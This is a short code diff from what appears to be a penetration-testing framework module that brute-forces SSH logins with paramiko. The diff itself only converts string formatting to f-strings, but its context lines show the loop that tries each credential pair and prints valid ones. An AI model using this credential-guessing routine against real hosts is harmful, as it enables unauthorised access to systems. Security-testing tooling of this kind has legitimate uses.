@@ -75,8 +75,7 @@ class Exploit(_Exploit):
 
         if self.simulate:
             DestructiveGate.print_simulation(
-                description="Would test {} credential pairs against SSH on {}:{}".format(
-                    len(creds), self.target, self.port),
+                description=f"Would test {len(creds)} credential pairs against SSH on {self.target}:{self.port}",
                 mitre_techniques=["T1694.001"],
             )
             return
@@ -85,8 +84,7 @@ class Exploit(_Exploit):
             print_error("paramiko required: pip install paramiko")
             return
 
-        print_status("Testing {} credential pairs against {}:{}…".format(
-            len(creds), self.target, self.port))
+        print_status(f"Testing {len(creds)} credential pairs against {self.target}:{self.port}…")
         for username, password in creds:
             try:
                 client = _paramiko.SSHClient()
@@ -94,7 +92,7 @@ class Exploit(_Exploit):
                 client.connect(self.target, port=self.port, username=username,
                                 password=password, timeout=self.timeout,
                                 allow_agent=False, look_for_keys=False)
-                print_success("VALID: {}:{} on {}:{}".format(username, password, self.target, self.port))
+                print_success(f"VALID: {username}:{password} on {self.target}:{self.port}")
                 client.close()
                 return
             except _paramiko.AuthenticationException:
